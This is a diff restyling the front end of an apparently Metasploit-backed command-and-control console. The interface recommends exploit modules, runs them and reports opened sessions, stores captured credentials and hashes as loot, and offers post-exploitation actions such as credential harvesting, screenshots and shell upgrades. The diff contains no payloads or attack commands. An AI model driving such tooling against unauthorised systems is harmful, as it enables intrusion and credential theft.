-                <Shield size={36} className="mb-3 opacity-20" />
-                <p className="text-sm">No matching modules found</p>
-                <p className="text-xs mt-1 text-slate-700">Run nmap/nikto scans to discover services and vulnerabilities first</p>
+              <div style={{ background: 'var(--bg-2)', border: ruleStrong, borderRadius: 4, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', padding: '48px 0', color: 'var(--fg-4)' }}>
+                <Icon name="shield" size={36} style={{ marginBottom: 12, opacity: 0.2 }} />
+                <p style={{ fontSize: 13 }}>No matching modules found</p>
+                <p style={{ fontSize: 11, marginTop: 4, color: 'var(--fg-4)' }}>Run nmap/nikto scans to discover services and vulnerabilities first</p>
               </div>
             )}
 
             {attackPlan && attackPlan.recommendations.map((rec, i) => {
-              const confColor = rec.confidence === 'high' ? 'text-red-400 border-red-500/30 bg-red-950/20'
-                : rec.confidence === 'medium' ? 'text-amber-400 border-amber-500/30 bg-amber-950/20'
-                : 'text-slate-400 border-slate-500/30 bg-slate-900/20'
-              const sevColor = rec.finding_severity === 'critical' ? 'text-red-400'
-                : rec.finding_severity === 'high' ? 'text-orange-400'
-                : rec.finding_severity === 'medium' ? 'text-amber-400'
-                : 'text-slate-500'
+              const confStyle = rec.confidence === 'high'
+                ? { color: 'var(--crit)', border: '1px solid rgba(232,64,64,0.3)', background: 'rgba(232,64,64,0.1)' }
+                : rec.confidence === 'medium'
+                ? { color: 'var(--accent)', border: '1px solid rgba(240,168,58,0.3)', background: 'rgba(240,168,58,0.1)' }
+                : { color: 'var(--fg-3)', border: '1px solid rgba(100,116,139,0.3)', background: 'rgba(100,116,139,0.1)' }
+              const sevColor = rec.finding_severity === 'critical' ? 'var(--crit)'
+                : rec.finding_severity === 'high' ? '#f97316'
+                : rec.finding_severity === 'medium' ? 'var(--accent)'
+                : 'var(--fg-3)'
               return (
-                <div key={i} className="glass rounded-xl border border-cyan-900/20 p-4 flex-shrink-0">
-                  <div className="flex items-start gap-3 mb-3">
-                    <span className={`text-[10px] font-bold px-2 py-0.5 rounded border uppercase flex-shrink-0 mt-0.5 ${confColor}`}>
+                <div key={i} style={{ background: 'var(--bg-2)', border: ruleStrong, borderRadius: 4, padding: 16, flexShrink: 0 }}>
+                  <div style={{ display: 'flex', alignItems: 'flex-start', gap: 12, marginBottom: 12 }}>
+                    <span style={{ fontSize: 10, fontWeight: 700, padding: '2px 8px', borderRadius: 4, textTransform: 'uppercase', flexShrink: 0, marginTop: 2, ...confStyle }}>
                       {rec.confidence}
                     </span>
-                    <div className="flex-1 min-w-0">
-                      <code className="text-sm font-mono text-cyan-300">{rec.module}</code>
+                    <div style={{ flex: 1, minWidth: 0 }}>
+                      <code style={{ fontSize: 13, fontFamily: 'var(--font-mono)', color: 'var(--fg)' }}>{rec.module}</code>
                       {rec.finding_title && (
-                        <p className="text-xs text-slate-500 mt-0.5 truncate">
-                          via <span className={`font-medium ${sevColor}`}>{rec.finding_title}</span>
-                          <span className="text-slate-700 mx-1">·</span>
-                          <span className="text-slate-600">{rec.match_reason}</span>
+                        <p style={{ fontSize: 11, color: 'var(--fg-3)', marginTop: 2, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
+                          via <span style={{ fontWeight: 500, color: sevColor }}>{rec.finding_title}</span>
+                          <span style={{ color: 'var(--fg-4)', margin: '0 4px' }}>·</span>
+                          <span style={{ color: 'var(--fg-4)' }}>{rec.match_reason}</span>
                         </p>
                       )}
                     </div>
                     <button
                       onClick={() => copyText(rec.module, `mod-${i}`)}
-                      className="text-slate-600 hover:text-cyan-400 transition-colors flex-shrink-0"
+                      style={{ background: 'none', border: 'none', cursor: 'pointer', color: 'var(--fg-4)', flexShrink: 0, padding: 0 }}
                       title="Copy module path"
                     >
-                      {copied === `mod-${i}` ? <Check size={13} className="text-green-400" /> : <Copy size={13} />}
+                      {copied === `mod-${i}` ? <Icon name="check" size={13} style={{ color: 'var(--ok)' }} /> : <Icon name="copy" size={13} />}
                     </button>
                   </div>
 
-                  <p className="text-xs text-slate-400 mb-3">{rec.description}</p>
+                  <p style={{ fontSize: 11, color: 'var(--fg-2)', marginBottom: 12 }}>{rec.description}</p>
 
                   {/* Options — editable */}
                   {Object.keys(rec.options).length > 0 && (
-                    <div className="bg-[#05080d] rounded-lg p-3 border border-cyan-900/20 mb-3 font-mono text-xs space-y-1.5">
-                      <div className="text-slate-600 text-[10px] uppercase tracking-wider mb-2">msf options</div>
+                    <div style={{ background: 'var(--bg)', borderRadius: 4, padding: 12, border: rule, marginBottom: 12, fontFamily: 'var(--font-mono)', fontSize: 11, display: 'flex', flexDirection: 'column', gap: 6 }}>
+                      <div style={{ fontSize: 10, color: 'var(--fg-4)', textTransform: 'uppercase', letterSpacing: '0.05em', marginBottom: 8 }}>msf options</div>
                       {Object.entries(rec.options).map(([k, v]) => (
-                        <div key={k} className="flex items-center gap-3">
-                          <span className="text-cyan-600 w-24 flex-shrink-0">set {k}</span>
+                        <div key={k} style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
+                          <span style={{ color: 'var(--accent)', width: 96, flexShrink: 0 }}>set {k}</span>
                           <input
-                            className="flex-1 bg-transparent border-b border-cyan-900/40 focus:border-cyan-500/60 outline-none text-slate-300 py-0.5"
+                            style={{ flex: 1, background: 'transparent', borderBottom: rule, borderTop: 'none', borderLeft: 'none', borderRight: 'none', outline: 'none', color: 'var(--fg)', padding: '2px 0', fontFamily: 'var(--font-mono)', fontSize: 11 }}
                             defaultValue={v}
                             onChange={e => { rec.options[k] = e.target.value }}
                           />
                         </div>
                       ))}
                       {rec.payload && (
-                        <div className="flex items-center gap-3">
-                          <span className="text-cyan-600 w-24 flex-shrink-0">set PAYLOAD</span>
+                        <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
+                          <span style={{ color: 'var(--accent)', width: 96, flexShrink: 0 }}>set PAYLOAD</span>
                           <input
-                            className="flex-1 bg-transparent border-b border-cyan-900/40 focus:border-cyan-500/60 outline-none text-slate-300 py-0.5"
+                            style={{ flex: 1, background: 'transparent', borderBottom: rule, borderTop: 'none', borderLeft: 'none', borderRight: 'none', outline: 'none', color: 'var(--fg)', padding: '2px 0', fontFamily: 'var(--font-mono)', fontSize: 11 }}
                             defaultValue={rec.payload}
                             onChange={e => { rec.payload = e.target.value }}
                           />
@@ -1685,10 +1831,10 @@ export default function C2Console() {
 
                   {/* Post modules */}
                   {rec.post_modules.length > 0 && (
-                    <div className="flex flex-wrap gap-1.5 mb-3">
-                      <span className="text-[10px] text-slate-600 self-center">post:</span>
+                    <div style={{ display: 'flex', flexWrap: 'wrap', gap: 6, marginBottom: 12, alignItems: 'center' }}>
+                      <span style={{ fontSize: 10, color: 'var(--fg-4)' }}>post:</span>
                       {rec.post_modules.map(pm => (
-                        <span key={pm} className="text-[10px] font-mono text-purple-400 bg-purple-950/30 border border-purple-500/20 px-2 py-0.5 rounded">
+                        <span key={pm} style={{ fontSize: 10, fontFamily: 'var(--font-mono)', color: '#a78bfa', background: 'rgba(167,139,250,0.1)', border: '1px solid rgba(167,139,250,0.2)', padding: '1px 8px', borderRadius: 4 }}>
                           {pm}
                         </span>
                       ))}
@@ -1697,46 +1843,51 @@ export default function C2Console() {
 
                   {/* Run button + result */}
                   {!rec.module.startsWith('—') && (
-                    <div className="flex flex-col gap-2 pt-1 border-t border-cyan-900/10">
-                    <div className="flex items-center gap-3">
+                    <div style={{ display: 'flex', flexDirection: 'column', gap: 8, paddingTop: 8, borderTop: rule }}>
+                    <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
                       <button
                         onClick={() => handleRunModule(rec, i)}
                         disabled={!msfStatus.connected || runningModule === i}
-                        className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-medium transition-all disabled:opacity-40
-                          bg-red-900/40 hover:bg-red-800/60 text-red-300 border border-red-700/30 hover:border-red-600/50"
+                        style={{
+                          display: 'flex', alignItems: 'center', gap: 6, padding: '6px 12px', borderRadius: 4, fontSize: 11, fontWeight: 500,
+                          background: 'rgba(232,64,64,0.1)', border: '1px solid rgba(232,64,64,0.3)', color: 'var(--crit)',
+                          cursor: (!msfStatus.connected || runningModule === i) ? 'not-allowed' : 'pointer',
+                          opacity: (!msfStatus.connected || runningModule === i) ? 0.4 : 1,
+                          fontFamily: 'var(--font-sans)',
+                        }}
                         title={!msfStatus.connected ? 'Connect to Metasploit first' : 'Run this module'}
                       >
                         {runningModule === i
-                          ? <><RefreshCw size={11} className="animate-spin" /> Running...</>
-                          : <><Play size={11} /> Run</>
+                          ? <><Icon name="refresh" size={11} className="animate-spin" /> Running...</>
+                          : <><Icon name="play" size={11} /> Run</>
                         }
                       </button>
                       {moduleResults[i] && (
                         moduleResults[i].error ? (
-                          <span className="text-xs text-red-400">{moduleResults[i].error}</span>
+                          <span style={{ fontSize: 11, color: 'var(--crit)' }}>{moduleResults[i].error}</span>
                         ) : moduleResults[i].new_session_id ? (
-                          <span className="text-xs text-green-400 flex items-center gap-1">
-                            <span className="relative flex h-2 w-2">
-                              <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75" />
-                              <span className="relative inline-flex rounded-full h-2 w-2 bg-green-500" />
+                          <span style={{ fontSize: 11, color: 'var(--ok)', display: 'flex', alignItems: 'center', gap: 6 }}>
+                            <span style={{ position: 'relative', display: 'flex', width: 8, height: 8 }}>
+                              <span className="animate-ping" style={{ position: 'absolute', display: 'inline-flex', width: '100%', height: '100%', borderRadius: '50%', background: 'var(--ok)', opacity: 0.75 }} />
+                              <span style={{ position: 'relative', display: 'inline-flex', borderRadius: '50%', width: 8, height: 8, background: 'var(--ok)' }} />
                             </span>
                             Session opened (MSF #{moduleResults[i].new_session_id})
                           </span>
                         ) : moduleResults[i].timed_out ? (
-                          <span className="flex items-center gap-2 flex-wrap">
-                            <span className="text-xs text-red-400">
+                          <span style={{ display: 'flex', alignItems: 'center', gap: 8, flexWrap: 'wrap' }}>
+                            <span style={{ fontSize: 11, color: 'var(--crit)' }}>
                               No callback received — job{moduleResults[i].job_id ? ` #${moduleResults[i].job_id}` : ''} timed out
                             </span>
                             <button
                               onClick={handleSync}
-                              className="text-[10px] text-cyan-400 hover:text-cyan-300 underline underline-offset-2"
+                              style={{ fontSize: 10, color: 'var(--accent)', background: 'none', border: 'none', cursor: 'pointer', textDecoration: 'underline', fontFamily: 'var(--font-sans)' }}
                             >
                               Sync sessions
                             </button>
                           </span>
                         ) : (
-                          <span className="flex items-center gap-2 flex-wrap">
-                            <span className="text-xs text-amber-400">
+                          <span style={{ display: 'flex', alignItems: 'center', gap: 8, flexWrap: 'wrap' }}>
+                            <span style={{ fontSize: 11, color: 'var(--accent)' }}>
                               {rec.module.startsWith('auxiliary/')
                                 ? `Scan running${moduleResults[i].job_id ? ` (#${moduleResults[i].job_id})` : ''}…`
                                 : `Job started${moduleResults[i].job_id ? ` (#${moduleResults[i].job_id})` : ''} — waiting for callback`
@@ -1745,7 +1896,7 @@ export default function C2Console() {
                             {!rec.module.startsWith('auxiliary/') && (
                               <button
                                 onClick={handleSync}
-                                className="text-[10px] text-cyan-400 hover:text-cyan-300 underline underline-offset-2"
+                                style={{ fontSize: 10, color: 'var(--accent)', background: 'none', border: 'none', cursor: 'pointer', textDecoration: 'underline', fontFamily: 'var(--font-sans)' }}
                               >
                                 Sync sessions
                               </button>
@@ -1755,7 +1906,7 @@ export default function C2Console() {
                       )}
                     </div>
                     {moduleResults[i]?.msf_result && (
-                      <pre className="text-[10px] font-mono text-slate-500 bg-[#05080d] rounded px-2 py-1.5 border border-cyan-900/20 overflow-x-auto">
+                      <pre style={{ fontSize: 10, fontFamily: 'var(--font-mono)', color: 'var(--fg-3)', background: 'var(--bg)', borderRadius: 4, padding: '6px 8px', border: rule, overflowX: 'auto' }}>
                         {JSON.stringify(moduleResults[i].msf_result, null, 2)}
                       </pre>
                     )}
@@ -1766,14 +1917,14 @@ export default function C2Console() {
             })}
 
             {attackPlan && attackPlan.unmatched_findings.length > 0 && (
-              <div className="glass rounded-xl border border-cyan-900/10 p-4 flex-shrink-0">
-                <p className="text-[10px] text-slate-600 uppercase tracking-wider mb-2">No module match found for:</p>
-                <div className="space-y-1">
+              <div style={{ background: 'var(--bg-2)', border: rule, borderRadius: 4, padding: 16, flexShrink: 0 }}>
+                <p style={{ fontSize: 10, color: 'var(--fg-4)', textTransform: 'uppercase', letterSpacing: '0.05em', marginBottom: 8 }}>No module match found for:</p>
+                <div style={{ display: 'flex', flexDirection: 'column', gap: 4 }}>
                   {attackPlan.unmatched_findings.map((f, i) => (
-                    <div key={i} className="text-xs text-slate-600 flex items-center gap-2">
-                      <span className="w-1.5 h-1.5 rounded-full bg-slate-700 flex-shrink-0" />
+                    <div key={i} style={{ fontSize: 11, color: 'var(--fg-4)', display: 'flex', alignItems: 'center', gap: 8 }}>
+                      <span style={{ width: 6, height: 6, borderRadius: '50%', background: 'var(--fg-4)', flexShrink: 0 }} />
                       {f.title}
-                      {f.cve_id && <span className="font-mono text-slate-700">{f.cve_id}</span>}
+                      {f.cve_id && <span style={{ fontFamily: 'var(--font-mono)', color: 'var(--fg-4)' }}>{f.cve_id}</span>}
                     </div>
                   ))}
                 </div>
@@ -1781,10 +1932,10 @@ export default function C2Console() {
             )}
 
             {!attackPlan && !generatingAttack && (
-              <div className="flex-1 glass rounded-xl border border-cyan-900/20 flex flex-col items-center justify-center text-slate-600 py-16">
-                <Crosshair size={40} className="mb-3 opacity-20 text-red-600" />
-                <p className="text-sm">Select a project and click Analyze</p>
-                <p className="text-xs mt-1 text-slate-700">Works best after running nmap and nikto scans</p>
+              <div style={{ flex: 1, background: 'var(--bg-2)', border: ruleStrong, borderRadius: 4, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', color: 'var(--fg-4)', padding: '64px 0' }}>
+                <Icon name="target" size={40} style={{ marginBottom: 12, opacity: 0.2, color: 'var(--crit)' }} />
+                <p style={{ fontSize: 13 }}>Select a project and click Analyze</p>
+                <p style={{ fontSize: 11, marginTop: 4, color: 'var(--fg-4)' }}>Works best after running nmap and nikto scans</p>
               </div>
             )}
           </div>
@@ -1792,184 +1943,187 @@ export default function C2Console() {
 
         {/* Loot tab */}
         {activeTab === 'loot' && (
-          <div className="flex-1 overflow-y-auto space-y-3">
+          <div style={{ flex: 1, overflowY: 'auto', display: 'flex', flexDirection: 'column', gap: 12 }}>
             {loot.length === 0 ? (
-              <div className="glass rounded-xl border border-cyan-900/20 flex flex-col items-center justify-center py-16 text-slate-600">
-                <Database size={40} className="mb-3 opacity-20 text-amber-600" />
-                <p className="text-sm">No loot captured yet</p>
-                <p className="text-xs mt-1 text-slate-700">Run post-exploitation modules to capture credentials, hashes, and files</p>
+              <div style={{ background: 'var(--bg-2)', border: ruleStrong, borderRadius: 4, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', padding: '64px 0', color: 'var(--fg-4)' }}>
+                <Icon name="layers" size={40} style={{ marginBottom: 12, opacity: 0.2, color: 'var(--accent)' }} />
+                <p style={{ fontSize: 13 }}>No loot captured yet</p>
+                <p style={{ fontSize: 11, marginTop: 4, color: 'var(--fg-4)' }}>Run post-exploitation modules to capture credentials, hashes, and files</p>
               </div>
-            ) : loot.map(item => (
-              <div key={item.id} className="glass glass-hover rounded-xl border border-cyan-900/20 p-4">
-                <div className="flex items-start gap-3">
-                  <span className={`text-xs px-2 py-0.5 rounded border font-semibold uppercase flex-shrink-0 ${LOOT_COLORS[item.loot_type] || LOOT_COLORS.system_info}`}>
-                    {item.loot_type}
-                  </span>
-                  <div className="flex-1 min-w-0">
-                    <div className="text-sm text-slate-200 font-medium">{item.title}</div>
-                    {item.source_path && <div className="text-xs text-slate-500 font-mono mt-0.5">{item.source_path}</div>}
-                    <div className="text-xs text-slate-600 mt-0.5">{new Date(item.captured_at).toLocaleString()}</div>
+            ) : loot.map(item => {
+              const ls = LOOT_STYLES[item.loot_type] ?? LOOT_STYLES.system_info
+              return (
+                <div key={item.id} style={{ background: 'var(--bg-2)', border: ruleStrong, borderRadius: 4, padding: 16 }}>
+                  <div style={{ display: 'flex', alignItems: 'flex-start', gap: 12 }}>
+                    <span style={{ fontSize: 11, padding: '2px 8px', borderRadius: 4, fontWeight: 600, textTransform: 'uppercase', flexShrink: 0, color: ls.color, border: ls.border, background: ls.background }}>
+                      {item.loot_type}
+                    </span>
+                    <div style={{ flex: 1, minWidth: 0 }}>
+                      <div style={{ fontSize: 13, color: 'var(--fg)', fontWeight: 500 }}>{item.title}</div>
+                      {item.source_path && <div style={{ fontSize: 11, color: 'var(--fg-3)', fontFamily: 'var(--font-mono)', marginTop: 2 }}>{item.source_path}</div>}
+                      <div style={{ fontSize: 11, color: 'var(--fg-4)', marginTop: 2 }}>{new Date(item.captured_at).toLocaleString()}</div>
+                    </div>
+                    <div style={{ display: 'flex', gap: 4, flexShrink: 0 }}>
+                      {item.content && (
+                        <>
+                          <button onClick={() => copyText(item.content, item.id)} style={{ background: 'none', border: 'none', cursor: 'pointer', color: 'var(--fg-4)', padding: 4 }}>
+                            {copied === item.id ? <Icon name="check" size={13} style={{ color: 'var(--ok)' }} /> : <Icon name="copy" size={13} />}
+                          </button>
+                          <button onClick={() => setShowLootContent(showLootContent === item.id ? null : item.id)} style={{ background: 'none', border: 'none', cursor: 'pointer', color: 'var(--fg-4)', padding: 4 }}>
+                            {showLootContent === item.id ? <Icon name="eye_off" size={13} /> : <Icon name="eye" size={13} />}
+                          </button>
+                        </>
+                      )}
+                      <button onClick={async () => { await fetch(`${getApiBase()}/c2/loot/${item.id}`, { method: 'DELETE' }); loadLoot() }} style={{ background: 'none', border: 'none', cursor: 'pointer', color: 'var(--fg-4)', padding: 4 }}>
+                        <Icon name="trash" size={13} />
+                      </button>
+                    </div>
                   </div>
-                  <div className="flex gap-1 flex-shrink-0">
-                    {item.content && (
-                      <>
-                        <button onClick={() => copyText(item.content, item.id)} className="text-slate-600 hover:text-cyan-400 transition-colors p-1">
-                          {copied === item.id ? <Check size={13} className="text-green-400" /> : <Copy size={13} />}
-                        </button>
-                        <button onClick={() => setShowLootContent(showLootContent === item.id ? null : item.id)} className="text-slate-600 hover:text-cyan-400 transition-colors p-1">
-                          {showLootContent === item.id ? <EyeOff size={13} /> : <Eye size={13} />}
-                        </button>
-                      </>
-                    )}
-                    <button onClick={async () => { await fetch(`/api/v1/c2/loot/${item.id}`, { method: 'DELETE' }); loadLoot() }} className="text-slate-600 hover:text-red-400 transition-colors p-1">
-                      <Trash2 size={13} />
-                    </button>
-                  </div>
+                  {showLootContent === item.id && item.content && (
+                    <pre style={{ marginTop: 12, background: 'var(--bg)', borderRadius: 4, padding: 12, fontSize: 11, fontFamily: 'var(--font-mono)', color: 'var(--fg-2)', overflowX: 'auto', whiteSpace: 'pre-wrap', border: rule, maxHeight: 160, overflowY: 'auto' }}>
+                      {item.content}
+                    </pre>
+                  )}
                 </div>
-                {showLootContent === item.id && item.content && (
-                  <pre className="mt-3 bg-[#05080d] rounded-lg p-3 text-xs font-mono text-slate-300 overflow-x-auto whitespace-pre-wrap border border-cyan-900/20 max-h-40 overflow-y-auto">
-                    {item.content}
-                  </pre>
-                )}
-              </div>
-            ))}
+              )
+            })}
           </div>
         )}
         {/* Post-Ex tab */}
         {activeTab === 'postex' && (
-          <div className="flex-1 overflow-y-auto space-y-4">
+          <div style={{ flex: 1, overflowY: 'auto', display: 'flex', flexDirection: 'column', gap: 16 }}>
             {!activeSession ? (
-              <div className="glass rounded-xl border border-cyan-900/20 flex flex-col items-center justify-center py-16 text-slate-600">
-                <ListChecks size={36} className="mb-3 opacity-20" />
-                <p className="text-sm">Select a session to view post-exploitation tools</p>
+              <div style={{ background: 'var(--bg-2)', border: ruleStrong, borderRadius: 4, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', padding: '64px 0', color: 'var(--fg-4)' }}>
+                <Icon name="check" size={36} style={{ marginBottom: 12, opacity: 0.2 }} />
+                <p style={{ fontSize: 13 }}>Select a session to view post-exploitation tools</p>
               </div>
             ) : (
               <>
                 {/* Quick actions */}
-                <div className="glass rounded-xl p-4 border border-cyan-900/20">
-                  <h3 className="text-sm font-semibold text-slate-200 mb-3 flex items-center gap-2">
-                    <Zap size={14} className="text-amber-400" /> Quick Actions
-                    <span className="ml-2 text-xs font-normal text-slate-500 font-mono">{activeSession.remote_host} · {activeSession.session_type}</span>
+                <div style={{ background: 'var(--bg-2)', border: ruleStrong, borderRadius: 4, padding: 16 }}>
+                  <h3 style={{ fontSize: 13, fontWeight: 600, color: 'var(--fg)', marginBottom: 12, display: 'flex', alignItems: 'center', gap: 8 }}>
+                    <Icon name="bolt" size={14} style={{ color: 'var(--accent)' }} /> Quick Actions
+                    <span style={{ marginLeft: 8, fontSize: 11, fontWeight: 400, color: 'var(--fg-3)', fontFamily: 'var(--font-mono)' }}>{activeSession.remote_host} · {activeSession.session_type}</span>
                   </h3>
-                  <div className="flex flex-wrap gap-2">
+                  <div style={{ display: 'flex', flexWrap: 'wrap', gap: 8 }}>
                     <button
                       onClick={handleAutoprobe}
                       disabled={probing}
-                      className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-cyan-900/30 hover:bg-cyan-800/40 border border-cyan-700/30 text-xs text-cyan-300 transition-all disabled:opacity-50"
+                      style={{ display: 'flex', alignItems: 'center', gap: 6, padding: '6px 12px', borderRadius: 4, background: 'rgba(240,168,58,0.08)', border: '1px solid rgba(240,168,58,0.2)', fontSize: 11, color: 'var(--fg-2)', cursor: probing ? 'not-allowed' : 'pointer', opacity: probing ? 0.5 : 1, fontFamily: 'var(--font-sans)' }}
                     >
-                      <RefreshCw size={12} className={probing ? 'animate-spin' : ''} />
+                      <Icon name="refresh" size={12} className={probing ? 'animate-spin' : ''} />
                       {probing ? 'Probing…' : 'Auto-Probe'}
                     </button>
                     <button
                       onClick={handleHarvestCreds}
                       disabled={harvesting}
-                      className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-amber-900/30 hover:bg-amber-800/40 border border-amber-700/30 text-xs text-amber-300 transition-all disabled:opacity-50"
+                      style={{ display: 'flex', alignItems: 'center', gap: 6, padding: '6px 12px', borderRadius: 4, background: 'rgba(240,168,58,0.08)', border: '1px solid rgba(240,168,58,0.2)', fontSize: 11, color: 'var(--accent)', cursor: harvesting ? 'not-allowed' : 'pointer', opacity: harvesting ? 0.5 : 1, fontFamily: 'var(--font-sans)' }}
                     >
-                      {harvesting ? <RefreshCw size={12} className="animate-spin" /> : <KeyRound size={12} />}
+                      {harvesting ? <Icon name="refresh" size={12} className="animate-spin" /> : <Icon name="key" size={12} />}
                       Harvest Creds
                     </button>
                     <button
                       onClick={handleScreenshot}
                       disabled={screenshotting || !activeSession.session_type.includes('meterpreter')}
                       title={!activeSession.session_type.includes('meterpreter') ? 'Requires Meterpreter' : ''}
-                      className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-blue-900/30 hover:bg-blue-800/40 border border-blue-700/30 text-xs text-blue-300 transition-all disabled:opacity-40"
+                      style={{ display: 'flex', alignItems: 'center', gap: 6, padding: '6px 12px', borderRadius: 4, background: 'rgba(180,130,60,0.08)', border: '1px solid rgba(180,130,60,0.2)', fontSize: 11, color: 'var(--med)', cursor: (screenshotting || !activeSession.session_type.includes('meterpreter')) ? 'not-allowed' : 'pointer', opacity: (screenshotting || !activeSession.session_type.includes('meterpreter')) ? 0.4 : 1, fontFamily: 'var(--font-sans)' }}
                     >
-                      {screenshotting ? <RefreshCw size={12} className="animate-spin" /> : <Camera size={12} />}
+                      {screenshotting ? <Icon name="refresh" size={12} className="animate-spin" /> : <Icon name="eye" size={12} />}
                       Screenshot
                     </button>
                     <button
                       onClick={handleUpgrade}
                       disabled={upgrading || activeSession.session_type.includes('meterpreter')}
                       title={activeSession.session_type.includes('meterpreter') ? 'Already Meterpreter' : 'Upgrade shell → Meterpreter'}
-                      className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-purple-900/30 hover:bg-purple-800/40 border border-purple-700/30 text-xs text-purple-300 transition-all disabled:opacity-40"
+                      style={{ display: 'flex', alignItems: 'center', gap: 6, padding: '6px 12px', borderRadius: 4, background: 'rgba(167,139,250,0.08)', border: '1px solid rgba(167,139,250,0.2)', fontSize: 11, color: '#a78bfa', cursor: (upgrading || activeSession.session_type.includes('meterpreter')) ? 'not-allowed' : 'pointer', opacity: (upgrading || activeSession.session_type.includes('meterpreter')) ? 0.4 : 1, fontFamily: 'var(--font-sans)' }}
                     >
-                      {upgrading ? <RefreshCw size={12} className="animate-spin" /> : <ArrowUpCircle size={12} />}
+                      {upgrading ? <Icon name="refresh" size={12} className="animate-spin" /> : <Icon name="upload" size={12} />}
                       Upgrade Shell
                     </button>
                   </div>
 
                   {/* Action output */}
                   {(probeOutput || harvestOutput || upgradeOutput || screenshotResult) && (
-                    <pre className="mt-3 bg-[#05080d] rounded-lg p-3 text-xs font-mono text-slate-300 whitespace-pre-wrap border border-cyan-900/20 max-h-40 overflow-y-auto">
+                    <pre style={{ marginTop: 12, background: 'var(--bg)', borderRadius: 4, padding: 12, fontSize: 11, fontFamily: 'var(--font-mono)', color: 'var(--fg-2)', whiteSpace: 'pre-wrap', border: rule, maxHeight: 160, overflowY: 'auto' }}>
                       {probeOutput || harvestOutput || upgradeOutput || screenshotResult}
                     </pre>
                   )}
                 </div>
 
                 {/* Parse Sysinfo */}
-                <div className="glass rounded-xl overflow-hidden border border-cyan-900/20">
-                  <div className="px-4 py-3 border-b border-cyan-900/20 flex items-center justify-between">
-                    <span className="text-xs font-semibold text-slate-400 uppercase tracking-wider flex items-center gap-2">
-                      <Shield size={13} /> Parse Sysinfo
+                <div style={{ background: 'var(--bg-2)', border: ruleStrong, borderRadius: 4, overflow: 'hidden' }}>
+                  <div style={{ padding: '10px 16px', borderBottom: rule, display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
+                    <span style={{ fontSize: 11, fontWeight: 600, color: 'var(--fg-3)', textTransform: 'uppercase', letterSpacing: '0.05em', display: 'flex', alignItems: 'center', gap: 8 }}>
+                      <Icon name="shield" size={13} /> Parse Sysinfo
                     </span>
                     {activeSession.sysinfo?.hostname && (
-                      <span className="text-[10px] font-mono text-cyan-400 truncate max-w-[120px]">
+                      <span style={{ fontSize: 10, fontFamily: 'var(--font-mono)', color: 'var(--accent)', overflow: 'hidden', textOverflow: 'ellipsis', maxWidth: 120 }}>
                         {activeSession.sysinfo.hostname}
                       </span>
                     )}
                   </div>
-                  <div className="p-3 space-y-2">
+                  <div style={{ padding: 12, display: 'flex', flexDirection: 'column', gap: 8 }}>
                     {activeSession.sysinfo ? (
-                      <div className="grid grid-cols-2 gap-x-3 gap-y-1 text-[11px] font-mono">
+                      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', columnGap: 12, rowGap: 4, fontSize: 11, fontFamily: 'var(--font-mono)' }}>
                         {([
-                          ['hostname', activeSession.sysinfo.hostname, 'text-cyan-300'],
-                          ['os',       activeSession.sysinfo.os,       'text-slate-300'],
-                          ['arch',     activeSession.sysinfo.arch,     'text-slate-300'],
-                          ['user',     activeSession.sysinfo.username, 'text-green-300'],
-                          ['domain',   activeSession.sysinfo.domain,   'text-purple-300'],
-                        ] as [string, string | null, string][]).filter(([, v]) => v).map(([k, v, cls]) => (
-                          <div key={k} className="flex gap-1.5 col-span-2">
-                            <span className="text-slate-600 w-14 flex-shrink-0">{k}</span>
-                            <span className={`${cls} truncate`} title={v!}>{v}</span>
+                          ['hostname', activeSession.sysinfo.hostname, 'var(--accent)'],
+                          ['os',       activeSession.sysinfo.os,       'var(--fg)'],
+                          ['arch',     activeSession.sysinfo.arch,     'var(--fg)'],
+                          ['user',     activeSession.sysinfo.username, 'var(--ok)'],
+                          ['domain',   activeSession.sysinfo.domain,   '#a78bfa'],
+                        ] as [string, string | null, string][]).filter(([, v]) => v).map(([k, v, clr]) => (
+                          <div key={k} style={{ display: 'flex', gap: 6, gridColumn: '1 / -1' }}>
+                            <span style={{ color: 'var(--fg-4)', width: 56, flexShrink: 0 }}>{k}</span>
+                            <span style={{ color: clr, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }} title={v!}>{v}</span>
                           </div>
                         ))}
                         {activeSession.sysinfo.is_admin !== null && (
-                          <div className="flex gap-1.5 col-span-2">
-                            <span className="text-slate-600 w-14 flex-shrink-0">admin</span>
-                            <span className={activeSession.sysinfo.is_admin ? 'text-yellow-400 font-bold' : 'text-slate-500'}>
+                          <div style={{ display: 'flex', gap: 6, gridColumn: '1 / -1' }}>
+                            <span style={{ color: 'var(--fg-4)', width: 56, flexShrink: 0 }}>admin</span>
+                            <span style={{ color: activeSession.sysinfo.is_admin ? 'var(--accent)' : 'var(--fg-3)', fontWeight: activeSession.sysinfo.is_admin ? 700 : 400 }}>
                               {activeSession.sysinfo.is_admin ? 'YES' : 'no'}
                             </span>
                           </div>
                         )}
                       </div>
                     ) : (
-                      <p className="text-[11px] text-slate-600">No sysinfo parsed yet. Paste command output below.</p>
+                      <p style={{ fontSize: 11, color: 'var(--fg-4)' }}>No sysinfo parsed yet. Paste command output below.</p>
                     )}
                     <textarea
                       value={sysinfoRaw}
                       onChange={e => setSysinfoRaw(e.target.value)}
                       placeholder="Paste sysinfo / systeminfo / uname -a output here…"
-                      className="w-full bg-[#05080d] border border-cyan-900/30 rounded px-2 py-1.5 text-[11px] font-mono text-slate-300 focus:outline-none focus:border-cyan-500/50 resize-none"
